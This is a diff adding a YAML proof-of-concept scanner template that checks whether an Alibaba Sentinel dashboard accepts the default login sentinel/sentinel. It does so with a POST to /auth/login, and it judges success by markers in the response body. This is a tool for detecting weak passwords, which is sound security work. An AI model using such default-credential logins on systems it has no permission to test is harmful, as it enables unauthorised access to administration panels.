@@ -1,0 +1,19 @@
+id: poc-yaml-sentinel-dashboard-weak-pass
+info:
+  name: Sentinel 控制面板弱口令
+  severity: high
+  tags:
+  - 弱口令
+  finger: Sentinel
+  osprey-id: vb_2020_0058
+requests:
+- method: POST
+  path: /auth/login?password=sentinel&username=sentinel
+  headers:
+    Cookie: JSESSIONID=8AD6F1A87C13A3C881C04063658DCECF
+  expression: 'contains(body, "{\"success\":true,\"code") && contains(body, ",\"msg\":\"success\"")
+    && contains(body, "nickName")
+
+    '
+variables: {}
+transport: http
